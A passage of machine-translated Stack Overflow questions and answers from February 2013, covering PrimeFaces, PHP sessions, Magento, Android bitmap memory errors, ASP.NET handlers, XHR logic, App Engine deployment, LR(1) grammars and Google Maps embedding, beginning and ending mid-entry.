    at org.primefaces.component.orderlist.OrderListRenderer.encodeOptions(OrderListRenderer.java:149)
    at org.primefaces.component.orderlist.OrderListRenderer.encodeList(OrderListRenderer.java:108) 
```

来自 PrimeFaces 3.4`OrderListRenderer`源代码：

```
90     protected void encodeList(FacesContext context, OrderList ol) throws IOException {
...
108        encodeOptions(context, ol, (List) ol.getValue());
...
115    }
...
143    @SuppressWarnings("unchecked")
144    protected void encodeOptions(FacesContext context, OrderList old, List model) throws IOException {
145        ResponseWriter writer = context.getResponseWriter();
146        String var = old.getVar();
147        Converter converter = old.getConverter();
148
149        for(Iterator it = model.iterator(); it.hasNext();) { 
```

因此，`model`is`null`和因此这个异常会在`<p:orderList value>`is`null`和你的`#{testBean.contacts}`return时发生`null`。确保它不是`null`. `#{testBean}`请注意，当在范围内找不到时也会发生这种情况。

# objective-c - 如何在 Objective-C 中将整列的值检索到 NSArray 或 NSMutableArray？

> ID：14853785
> 
> 赞同：0
> 
> 时间：2013-02-13T12:39:21.380
> 
> 标签：objective-c, sqlite

我是 Objective-C 的新手。我创建了一个单一视图应用程序，用于存储和检索 sqlite 数据库中的值。但是我能够理解如何将整个列数据从 sqlite 数据库存储到 NSArray 或 NSMutableArray。我知道我需要编写的 SQL 语句。请指导我如何用`NSArray`或`NSMutableArray`指针替换此语句？

```
NSString *addressField = [[NSString alloc] initWithUTF8String:(const char *) sqlite3_column_text(statement, 0)]; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T13:28:43.243

您可能想查看 FMDB。它是一个围绕 SQLite 的objective-c 包装器，允许您从objective-c 轻松访问SQLite 数据库。它避免了必须在直接 c 中访问 SQLite 数据库的麻烦。这应该可以帮助您设置/检索数据库中的值。

您可以在此处找到 FMDB 的代码： [https ://github.com/ccgus/fmdb](https://github.com/ccgus/fmdb)

# php - session 不保留数据

> ID：14853786
> 
> 赞同：-1
> 
> 时间：2013-02-13T12:39:28.583
> 
> 标签：php, session, session-cookies, session-state

我有一个简单的 php 页面，它设置会话并重定向到另一个页面，但由于某种原因，第二页中的会话为空。

索引.php

```
<?php session_start(); ?>
<?php 
 $_SESSION['name'] = "Saeed";
 echo $_SESSION['name'] ;  <<< it shows the correct output
 echo '<script type="text/javascript">window.top.location="otherpages/page.php";</script>';
?> 
```

页面.php

```
<?php session_start(); ?>
<?php
           echo "session>>>".$_SESSION['name'];  
        ?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:49:04.497

验证 php.ini 中的 tmp 文件夹或 session.save_path 是否可写

Ps.：必须在这两种情况下都有效。使用 php 标头或 javascript 位置调用另一个页面

# magento - Magento 1.5.1 不显示子类别

> ID：14853789
> 
> 赞同：0
> 
> 时间：2013-02-13T12:39:35.767
> 
> 标签：magento, categories, visible

今天是个好日子！

我的多店 Magento 有问题。

Magento 版本 1.5.1

我创建了一个新的根类别，类别为“男性”和“女性”，“男性”包含 2 个子类别，但不显示。

包括每个类别在内的所有根类别都设置为活动，启用“包含在导航菜单中”并且还设置为锚点。

男性和女性仍然可见，但男性中的 2 个子类别没有出现在任何地方。

还打印了包含有关类别的所有信息的数组，但 Men 中的 2 个子类别不在此数组中。

注意：缓存已禁用。

请问，谁能帮帮我？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:44:12.617

在后端，转到系统 > 配置。

在目录选项卡中，您有“类别顶部导航”。检查最大深度是否设置为 0 或大于 3。

# android - Android：另一个“错误膨胀类

> ID：14853796
> 
> 赞同：0
> 
> 时间：2013-02-13T12:40:16.247
> 
> 标签：android, image, memory, animationdrawable

我在我的活动“GameActivity”中使用了很多图像（我做 imageView.setImageDrawable(AnimationDrawable) 其中 AnimationDrawable 有超过 16 个频率，我在第二个活动“ShareActivity”中不使用的图像

然而出现了这个错误

```
02-13 12:36:47.943: E/AndroidRuntime(14790): FATAL EXCEPTION: main
02-13 12:36:47.943: E/AndroidRuntime(14790): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.example.kersplatt/com.example.kersplatt.ShareActivity}: android.view.InflateException: Binary XML file line #19: Error inflating class <unknown>
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1647)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1663)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.app.ActivityThread.access$1500(ActivityThread.java:117)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:931)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.os.Handler.dispatchMessage(Handler.java:99)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.os.Looper.loop(Looper.java:130)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.app.ActivityThread.main(ActivityThread.java:3683)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at java.lang.reflect.Method.invokeNative(Native Method)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at java.lang.reflect.Method.invoke(Method.java:507)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:875)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:633)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at dalvik.system.NativeStart.main(Native Method)
02-13 12:36:47.943: E/AndroidRuntime(14790): Caused by: android.view.InflateException: Binary XML file line #19: Error inflating class <unknown>
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.view.LayoutInflater.createView(LayoutInflater.java:518)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at com.android.internal.policy.impl.PhoneLayoutInflater.onCreateView(PhoneLayoutInflater.java:56)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:568)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.view.LayoutInflater.rInflate(LayoutInflater.java:623)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.view.LayoutInflater.inflate(LayoutInflater.java:408)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.view.LayoutInflater.inflate(LayoutInflater.java:320)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.view.LayoutInflater.inflate(LayoutInflater.java:276)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at com.android.internal.policy.impl.PhoneWindow.setContentView(PhoneWindow.java:209)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.app.Activity.setContentView(Activity.java:1657)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at com.example.kersplatt.ShareActivity.onCreate(ShareActivity.java:65)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1047)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1611)
02-13 12:36:47.943: E/AndroidRuntime(14790):    ... 11 more
02-13 12:36:47.943: E/AndroidRuntime(14790): Caused by: java.lang.reflect.InvocationTargetException
02-13 12:36:47.943: E/AndroidRuntime(14790):    at java.lang.reflect.Constructor.constructNative(Native Method)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at java.lang.reflect.Constructor.newInstance(Constructor.java:415)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.view.LayoutInflater.createView(LayoutInflater.java:505)
02-13 12:36:47.943: E/AndroidRuntime(14790):    ... 22 more
02-13 12:36:47.943: E/AndroidRuntime(14790): Caused by: java.lang.OutOfMemoryError: bitmap size exceeds VM budget
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.graphics.BitmapFactory.nativeDecodeAsset(Native Method)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.graphics.BitmapFactory.decodeStream(BitmapFactory.java:460)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.graphics.BitmapFactory.decodeResourceStream(BitmapFactory.java:336)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.graphics.drawable.Drawable.createFromResourceStream(Drawable.java:697)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.content.res.Resources.loadDrawable(Resources.java:1709)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.content.res.TypedArray.getDrawable(TypedArray.java:601)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.view.View.<init>(View.java:1951)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.view.View.<init>(View.java:1899)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.view.ViewGroup.<init>(ViewGroup.java:286)
02-13 12:36:47.943: E/AndroidRuntime(14790):    at android.widget.LinearLayout.<init>(LinearLayout.java:120) 
```

这是我所有的 XML

```
<?xml version="1.0" encoding="utf-8"?>

<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:weightSum="10"
    android:orientation="vertical"
    android:background="@drawable/fond">

     <ImageView
         android:id="@+id/imageView9"
         android:layout_width="fill_parent"
         android:layout_height="wrap_content"
         android:layout_weight="2"
         android:scaleType="fitXY"
         android:src="@drawable/bandeau" />

LINE 19 <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:weightSum="3"
    android:layout_weight="6"
    android:layout_gravity="center" 
    android:orientation="vertical"
    android:background="@drawable/fondshare" >    

      <LinearLayout
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
         android:weightSum="2"
         android:layout_weight="1"
         android:layout_gravity="center" 
         android:layout_marginTop="10dp"
         android:orientation="horizontal" >

             <ImageView
                 android:id="@+id/imageView5"
                 android:layout_width="fill_parent"
                 android:layout_weight="1"
                 android:layout_height="fill_parent"
                 android:adjustViewBounds="true"
                 android:src="@drawable/cadre" />

           <ImageView
             android:id="@+id/imageView8"
             android:layout_width="fill_parent"
             android:layout_height="fill_parent"
             android:adjustViewBounds="true"
             android:layout_weight="1"
             android:src="@drawable/niceshot" />
     </LinearLayout>

     <LinearLayout
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
         android:layout_weight="2"
         android:weightSum="5"
         android:layout_gravity="center" 
         android:layout_marginLeft="20dp"
         android:layout_marginRight="20dp"
         android:layout_marginBottom="10dp"
         android:orientation="vertical">

        <ImageView
             android:id="@+id/imageView7"
             android:layout_weight="1"
             android:layout_width="wrap_content"
             android:layout_height="fill_parent"
             android:adjustViewBounds="true"
             android:src="@drawable/enterthename" />

         <EditText
             android:id="@+id/editText1"
             android:layout_weight="1"
             android:layout_width="fill_parent"
             android:layout_height="fill_parent"
             android:layout_marginTop="4dp" />

         <ImageView
             android:id="@+id/imageView2"
             android:layout_weight="1"             
             android:layout_width="fill_parent"
             android:layout_height="fill_parent"
             android:layout_marginTop="4dp"
             android:adjustViewBounds="true"
             android:src="@drawable/sharefacebook" />

         <ImageView
             android:id="@+id/imageView3"
             android:layout_weight="1"             
             android:layout_width="fill_parent"
             android:layout_height="fill_parent"
             android:layout_marginTop="4dp"
             android:adjustViewBounds="true"
             android:src="@drawable/sharetwitter" />

         <ImageView
             android:id="@+id/imageView6"
              android:layout_weight="1"            
             android:layout_width="fill_parent"
             android:layout_height="fill_parent"
             android:layout_marginTop="4dp"
             android:adjustViewBounds="true"
             android:src="@drawable/sharefacebook" />
     </LinearLayout>
     </LinearLayout>

     <ImageView
         android:id="@+id/imageView10"
         android:layout_width="fill_parent"
         android:layout_height="wrap_content"
         android:layout_weight="2"
         android:scaleType="fitEnd"
         android:src="@drawable/dim" />

</LinearLayout> 
```

我的错误是因为动画可绘制吗？我怎样才能“清除”它的内存或回收它？

**编辑**

我的问题来自

```
BitmapFactory.decodeFile(file.getAbsolutePath()); 
```

知道我应该清除什么，因为我已经回收了其他位图

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T13:03:16.810

听起来你有内存泄漏。问题不在于处理很多图像，而是当您的活动被销毁时您的图像没有被释放。

这可能会有所帮助，

[http://android-developers.blogspot.de/2009/01/avoiding-memory-leaks.html](http://android-developers.blogspot.de/2009/01/avoiding-memory-leaks.html)

为避免此问题，您可以在将 Bitmap 对象设为空（或设置另一个值）之前使用本机方法 Bitmap.recycle()。例子：

```
 public final void setMyBitmap(Bitmap bitmap) {
  if (this.myBitmap != null) {
this.myBitmap.recycle();
 }
this.myBitmap = bitmap;
} 
```

调用垃圾收集器是个好主意。

```
public void clearAllResources() {

// Set related variables null

System.gc();
Runtime.getRuntime().gc();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T12:49:21.890

我认为 xmlns 应该只在第一个布局中。尝试从第 19 行开始替换您的块：

```
<LinearLayout android:layout_width="wrap_content"
android:layout_height="wrap_content"
android:weightSum="3"
android:layout_weight="6"
android:layout_gravity="center" 
android:orientation="vertical"
android:background="@drawable/fondshare" > 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-27T19:47:39.440

我认为问题出在最新的更新 ADT

[http://android.foxykeep.com/dev/how-to-fix-the-classdefnotfounderror-with-adt-17](http://android.foxykeep.com/dev/how-to-fix-the-classdefnotfounderror-with-adt-17)

# c# - 预期的 ; @page 指令错误（Asp.net）上的（分号）

> ID：14853798
> 
> 赞同：0
> 
> 时间：2013-02-13T12:40:19.800
> 
> 标签：c#, asp.net

在一个 Asp.net 网页中，我收到一条错误消息，指出`; expected`引用该`@page`指令。我不知道它是如何起源的，我唯一奇怪的想法是更改页面文档类型。但是删除它并不能解决错误。

```
<%@ Page Language="C#" AutoEventWireup="True" CodeBehind="Mypage.aspx.cs" Inherits="Namespace.Mypage" %>

<%@ Register Assembly="AjaxControlToolkit" Namespace="AjaxControlToolkit" TagPrefix="ajaxToolkit" %> 
```

删除下一行它仍然失败。我无法打开页面。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T13:23:12.070

注释掉后面代码中的所有内容，然后将所有内容从标记页面中取出，看看是否有效。逐块添加标记块，直到找到流氓角色。

正如乔尔·埃瑟顿（Joel Etherton）在上面指出的那样，附近线路中的其他东西。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T14:49:57.970

这是一个`<img alt="icon" src='<% Eval("Icon") %>' />`不受数据约束的导致它失败的原因。

# c# - ASP.net Handler 和 Generic Handler 的区别

> ID：14853799
> 
> 赞同：15
> 
> 时间：2013-02-13T12:40:34.693
> 
> 标签：c#, asp.net, .net

当我们在 Visual Studio 2010 中向 ASP.NET Web 应用程序项目添加新项目时，我注意到两个模板：

1.  ASP.NET 处理程序
2.  通用处理程序

这两者有什么区别，什么时候使用？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2013-02-13T12:59:06.013

**通用处理程序**：

通用处理程序是一个默认处理程序，它将具有 @webhandler 指令并具有 .ashx 扩展名。此通用处理程序没有 UI，但它会在向此处理程序发出任何请求时提供响应。

**HTTP 处理程序**：

HTTP Handler 是一个运行并继续服务器请求并根据请求处理代码给出响应的进程。此处理程序没有 UI，需要在 web.config 中针对扩展进行配置。Http Handler 的一个很好的例子是 ASP.NET 的页面处理程序，它服务于 .aspx 页面请求。

**通用**和**HTTP 处理程序**之间的主要区别是

通用处理程序有一个处理程序，可以通过带有 .ashx 扩展名的 url 访问，而 http 处理程序需要在 web.config 中针对 web.config 中的扩展名进行配置。它没有任何扩展名。通用处理程序的典型示例是创建缩略图图像和用于服务 .aspx 扩展请求并给出响应的 http 处理程序页面处理程序。

要了解更多信息，请参阅此[链接](http://weblogs.asp.net/jalpeshpvadgama/archive/2012/01/07/difference-between-generic-handler-and-http-handler-asp-net.aspx)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-02-13T12:49:50.960

*   **ASP.Net 处理**程序是所有 ASP.Net 页面的默认 HTTP 处理程序。
*   **通用处理**程序是所有没有 UI 并且包含 @WebHandler 指令的 Web 处理程序的默认 HTTP 处理程序。

有关详细信息，请参阅[MSDN](http://msdn.microsoft.com/en-us/library/bb398986%28v=vs.100%29.aspx#Features)。

# javascript - 如何在 XHR 上执行条件语句

> ID：14853800
> 
> 赞同：0
> 
> 时间：2013-02-13T12:40:34.263
> 
> 标签：javascript, ajax

我需要对第一个 XHR 执行条件检查，如果满足条件，则执行第二个 XHR，它将使用设置请求标头来限制范围。

```
function getData( url )
{           
    if  (y==0) { 
    alert ("you set vaue of y to 1");
        var request = new XMLHttpRequest();  
        request.onreadystatechange = function(){
            if ( request.readyState == 4 ){
                renderData( request.responseText );
                request.open( "GET", "TheData.csv", true );
                //request.send( null ); 
                y = 1;
            }     
        }
    } else {
        var request = new XMLHttpRequest();  
        request.onreadystatechange = function(){
            if ( request.readyState == 4 ){
                renderData( request.responseText );
                request.open( "GET", "TheData.csv", true );
                //request.send( null ); 
                request.setRequestHeader("Range", "bytes=" + BytesRead + "-");  
            }
        }
    }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T13:19:45.173

你目前的逻辑如下：

*   做一点事
*   准备请求
*   当请求完成时
    *   对响应做一些事情
    *   发送请求

这意味着在响应返回之前不会发送请求。从逻辑上讲，在您发送请求之前也不会返回响应（Javascript / Internet 不支持时间循环逻辑，抱歉）。这意味着请求永远不会被发送。也许你想要这个：

*   做一点事
*   准备请求
*   当请求完成时
    *   对响应做一些事情
*   发送请求

编辑您的代码，

```
function getData( url ){           
    if  (y==0) { 
    alert ("you set vaue of y to 1");
        var request = new XMLHttpRequest();  
        request.onreadystatechange = function(){
            if ( request.readyState == 4 ){
                renderData( request.responseText );
                y = 1;
            }     
            request.open( "GET", "TheData.csv", true );
            request.send( null ); 
       }
    } else {
        var request = new XMLHttpRequest();  
        request.onreadystatechange = function(){
            if ( request.readyState == 4 ){
                renderData( request.responseText );
                request.setRequestHeader("Range", "bytes=" + BytesRead + "-");  
            }
        }
        request.open( "GET", "TheData.csv", true );
        request.send( null ); 
   }
} 
```

* * *

还要注意你重复了很多次。您可以将代码缩短为

```
function getData( url ){           
    var request = new XMLHttpRequest();  
    if (y!=0) { 
        request.setRequestHeader("Range", "bytes=" + BytesRead + "-");  
    }
    request.onreadystatechange = function(){
        if ( request.readyState == 4 ){
            renderData( request.responseText );
            y = 1; //assuming `y` never gets reset to 0
        }
    }
    request.open( "GET", "TheData.csv", true );
    request.send( null ); 
} 
```

另请注意，变量`BytesRead`应该是小写，而不是大写（=> `bytesRead`），并且您不需要传递`null`参数来发送（如果我正确阅读了文档）。

另请注意，通过全局变量传递参数是一种不好的做法。在你的情况下，`BytesRead`看起来像一个全局变量（我不认为这是一个内部函数）。

* * *

另请注意，即使您使用自定义标头，jQuery 也会稍微简化流程，您是否愿意使用 jQuery：

```
function getData(url){
    var headers = {};
    if(y!=0){
        headers.range = "bytes=" + BytesRead + "-"
    }
    $.ajax(url, {
      headers: headers,
      dataType: "text"   //prevent automatic parsing (degression)
    }).done(function(response){
      renderData(response);
      y=1;          
    });
} 
```

甚至

```
function getData(url){
    $.ajax(url, {
        headers: (y!=0) ? {} : {range : "bytes=" + BytesRead + "-"},
        dataType: "text"
    }).done(function(response){
        renderData(response);
        y=1; 
    }); 
} 
```

参考：[https ://developer.mozilla.org/en-US/docs/DOM/XMLHttpRequest](https://developer.mozilla.org/en-US/docs/DOM/XMLHttpRequest)

# google-app-engine - 如何在 Intellij IDEA 12 中部署到 Google App Engine

> ID：14853805
> 
> 赞同：2
> 
> 时间：2013-02-13T12:40:46.110
> 
> 标签：google-app-engine, gwt, intellij-idea

我需要将 Hello-World 应用程序部署到 Google App Engine。我想通过 IDEA 来实现，因为我有 Ultimate 。但我找不到如何做到这一点。您能否逐步解释我应该如何部署？

我从 Idea 模板创建了项目，添加了 appengine-web.xml，指定了注册的应用程序名称。尚未创建任何工件/WAR。

我没有菜单项“上传 App Engine 应用程序”，如[http://www.jetbrains.com/idea/webhelp/uploading-application-to-google-app-engine.html所示](http://www.jetbrains.com/idea/webhelp/uploading-application-to-google-app-engine.html)

我的菜单->“工具”是：

[![](../Images/be078ffa02426bd3955d09b554b63d55.png)](https://i.stack.imgur.com/Wco0d.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T16:36:24.483

[确保为应用程序正确配置了](http://img811.imageshack.us/img811/425/20130213203403.png)Google App Engine facet 和 SDK 。

你应该得到这个菜单：

![上传](../Images/ef7dcb14e320b4102ab0b561302966e8.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T12:55:06.163

部署到 Google App Engine 的最佳和最简单的方法是使用 Maven 插件。

```
<!-- The actual maven-gae-plugin. Type "mvn gae:run" to run project, "mvn gae:deploy"
     to upload to GAE. -->
<plugin>
   <groupId>net.kindleit</groupId>
   <artifactId>maven-gae-plugin</artifactId>
   <version>0.9.5</version>
</plugin> 
```

如果您想追求这一点，那么我很乐意帮助您在此处配置后续问题。

# javascript - 对话框脚本不起作用

> ID：14853806
> 
> 赞同：0
> 
> 时间：2013-02-13T12:40:52.343
> 
> 标签：javascript, dialog

伙计们，下面是我的脚本，但它不起作用谁能告诉我为什么？？？
要检查吗？请在以下位置使用此脚本：- [http://calcus.host56.com/make_your_own_link.htm](http://calcus.host56.com/make_your_own_link.htm)

```
 <html><head>
    <title>Hello</title>
    <style>
    a {color:black;font-size:23;}
    textarea {color:white;font-size:1;border:none;}
    </style>
    <script>

    function select8()
    {
    document.getElementById("demo").select();
    }

    </script>

    </head>
    <body>
    <script>
    function myFunction()
    {
    var x;

    var name=prompt("Please enter your Facebook username","");

    if (name!=null)
      {
      x="https://www.facebook.com/dialog/apprequests?api_key=148768088503846&app_id=148768088503846&data=%7B%7B"+"category"+"%3A"+"virtue"+"%7D%7D&display=popup&filters"+"&frictionless=false&locale=en_US&message=Here+is+a+Virtue+for+you+Mihir+Gupta%21%21+By+Chirag+Jain&next=http%3A%2F%2Fvolcanoisland.brokenbulbstudios.com%2F%252Ff312818684%26relation%3Dopener%26transport%3Dpostmessage%26frame%3Df18dc1ab6%26result%3D%2522xxRESULTTOKENxx%2522"+"&sdk=joey&title=Send+your+friends+a+daily+gift&to="+name;document.getElementById("demo").innerHTML=x;
      }
    }
    </script>
    <button onclick="myFunction()" accesskey="v">Click Here to Make Your Own Virtue Link </button>
    <br>
    <textarea id="demo">Your Url Here</textarea>

    <button onclick="select8()" accesskey="x">Entered username?? <br>Now Click here and press Ctrl + c to copy the link </button> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:50:40.927

试试[这个 jsfiddle](http://jsfiddle.net/tpvyp/)。您必须`myFunction()`在`head`部分中定义。

```
 <html>
   <head>
    <title>Hello</title>
    <style>
    a {color:black;font-size:23;}
    textarea {color:white;font-size:1;border:none;}
    </style>
    <script>

    function myFunction()
    {
    var x;

    var name=prompt("Please enter your Facebook username","");

    if (name!=null)
      {
      x="https://www.facebook.com/dialog/apprequests?api_key=148768088503846&app_id=148768088503846&data=%7B%7B"+"category"+"%3A"+"virtue"+"%7D%7D&display=popup&filters"+"&frictionless=false&locale=en_US&message=Here+is+a+Virtue+for+you+Mihir+Gupta%21%21+By+Chirag+Jain&next=http%3A%2F%2Fvolcanoisland.brokenbulbstudios.com%2F%252Ff312818684%26relation%3Dopener%26transport%3Dpostmessage%26frame%3Df18dc1ab6%26result%3D%2522xxRESULTTOKENxx%2522"+"&sdk=joey&title=Send+your+friends+a+daily+gift&to="+name;document.getElementById("demo").innerHTML=x;
      }
    }

    function select8()
    {
    document.getElementById("demo").select();
    }

    </script>
    </head>
    <body>
    <button onclick="myFunction()" accesskey="v">Click Here to Make Your Own Virtue Link </button>
    <br>
    <textarea id="demo">Your Url Here</textarea>

        <button onclick="select8()" accesskey="x"> Entered username?? <br />Now Click here and press Ctrl + c to copy the link </button>
  </body>
</html> 
```

# parsing - LR(1) 语法：如何分辨？支持/反对的例子？

> ID：14853808
> 
> 赞同：2
> 
> 时间：2013-02-13T12:40:55.970
> 
> 标签：parsing, grammar, bison, context-free-grammar, lr1

我目前正在查看 GNU Bison 来解析程序代码（或者实际上是扩展使用 Bison 来执行此操作的程序）。我知道 Bison 只能（或：最好）处理 LR(1) 语法，即一种特殊形式的上下文无关语法；而且我实际上也（相信）理解上下文无关和 LR(1) 语法的规则。

但是，不知何故，我对 LR(1) 语法的概念缺乏很好的理解。以 SQL 为例。SQL 包含——我相信——一种上下文无关的语法。但它也是 LR(1) 语法吗？我怎么知道？如果是，什么会违反 LR(1) 规则？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T12:48:55.500

LR(1) 意味着您可以通过知道所有将被减少的标记加上它们后面的一个标记来选择适当的规则来减少。`AND`在布尔查询和`BETWEEN`操作中没有问题。例如，以下语法是 LL(1)，因此也是 LR(1)：

```
expr ::= and_expr | between_expr | variable
and_expr ::= expr "and" expr
between_expr ::= "between" expr "and" expr
variable ::= x 
```

我相信整个 SQL 语法比 LR(1) 还要简单。可能是 LR(0) 甚至 LL(n)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-17T17:55:18.427

我的一些客户使用我的 LALR(1) 解析器生成器创建了 SQL 和 DB2 解析器，并成功使用了多年。他们发给我的语法是 LALR(1)（除了按您想要的方式解决的 shift-reduce 冲突）。对于纯粹主义者 - 不是 LALR(1)，但在实践中工作正常，不需要 GLR 或 LR(1)。你甚至不需要更强大的 LR(1)，AFAIK。

我认为解决这个问题的最好方法是找到一个 SQL 语法和一个好的 LALR/LR(1) 解析器生成器，看看你是否得到冲突报告。我记得一个 SQL 语法（有点过时）是 LALR(1)，可以在这个下载中找到：http: [//lrstar.tech/downloads.html](http://lrstar.tech/downloads.html)

[LRSTAR](http://lrstar.tech)是一个 LR(1) 解析器生成器，它会给你一个冲突报告。如果您无法解决冲突，它也是 LR(*)。

# c# - 下拉列表列之间的特定距离（空白）

> ID：14853811
> 
> 赞同：0
> 
> 时间：2013-02-13T12:41:09.067
> 
> 标签：c#, asp.net

在我有一个关于（下拉列表的列之间的特定距离（空格））的问题之前，我收到了如下代码的答案，我的问题是列之间的空格将由'_'填充，当我将其更改为类似" "，它不起作用并且列彼此相邻，我需要列之间的空白，我该怎么做？

```
protected void ddlStack_Load(object sender, EventArgs e)
{
    var all = from o in _DataContext.tblDocuments
              orderby o.DocumentNo
              select o;
    int maxs = 0;
    foreach (tblDocuments v in all)
    {
        if (v.DocumentNo.Length > maxs)
            maxs = v.DocumentNo.Length;
    }

    foreach (tblDocuments vv in all)
    {
        string doctitle = vv.DocumentNo;
        for (int i = vv.DocumentNo.Length; i < maxs + 2; i++)
        {
            doctitle += '_';
        }
        doctitle += " | ";
        doctitle +=  vv.DocID;
        ddlStack.Items.Add(new ListItem(doctitle, vv.vendorID.ToString()));
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T12:59:42.153

您应该使用**`&nbsp;`**而不是常规的“”（空格），然后在创建 ListBoxItem 之前使用**HtmlDecode** ...

尝试这样的事情：

```
foreach (tblDocuments vv in all)
{
    string doctitle = vv.DocumentNo;
    for (int i = vv.DocumentNo.Length; i < maxs + 2; i++)
    {
        doctitle += "&nbsp;";

    }
    doctitle += "&nbsp;|&nbsp;";
    doctitle +=  vv.DocID;

    // Use HtmlDecode to correctly show the spaces
    doctitle = HttpUtility.HtmlDecode(doctitle );

    ddlStack.Items.Add(new ListItem(doctitle, vv.vendorID.ToString()));
} 
```

# jquery - 在页面中嵌入谷歌地图：地图虽然存在于 HTML 中但不可见

> ID：14853812
> 
> 赞同：-1
> 
> 时间：2013-02-13T12:41:11.253
> 
> 标签：jquery, css, google-maps

我正在尝试使用[http://code.google.com/p/jquery-ui-map/](http://code.google.com/p/jquery-ui-map/)在我的本地开发环境 (WAMP) 中嵌入谷歌地图。

我已经加载了所有需要的脚本：

```
<script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=true"></script><script src="http://maps.gstatic.com/intl/en_ALL/mapfiles/api-3/10/22/main.js" type="text/javascript"></script>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js"></script>
<script type="text/javascript" src="/app_dev.php/js/fcc600e_part_1_jquery.ui.map.full.min_1.js"></script>
<script type="text/javascript" src="/app_dev.php/js/fcc600e_part_1_myscript_2.js"></script>
<script>
      $('#map_canvas').gmap().bind('init', function(ev, map) {
        $('#map_canvas').gmap('addMarker', {'position': '57.7973333,12.0502107', 'bounds': true}).click(function() {
            $('#map_canvas').gmap('openInfoWindow', {'content': 'Hello World!'}, this);
        });
    });
</script> 
```

`<div id="map_canvas"></div>`当然，我在脚本调用之前在我的 HTML 中放了一个空。

该函数已执行，完全没有控制台错误。我在“#map_canvas”中看到了 html，但地图位于视口之外的某个位置，朝向顶部，并且完全不可见。（似乎是内联 CSS 告诉它绝对定位..）

这是呈现的 HTML： http: [//pastebin.com/V2cMt4Kr](http://pastebin.com/V2cMt4Kr)

这是我使用的代码的实际实时链接： [http ://www.isawu.eu/index.html](http://www.isawu.eu/index.html)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T13:34:30.060

我猜你没有为你的地图容器放置任何 CSS 代码。检查我的例子：http: [//jsfiddle.net/Ywknf/12/](http://jsfiddle.net/Ywknf/12/)

除了最后一个（#map_canvas3）之外，所有位于 CSS 中的地图（内联或非内联）都是可见的

```
 <div id="map_canvas"></div>
        <div id="map_canvas1"></div>
        <div id="map_canvas2" style="width:400px; height:300px;"></div>
        <div id="map_canvas3"></div> <!--invisible --> 
```

Καλή συνέχεια στην προσπάθεια

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T13:35:46.360

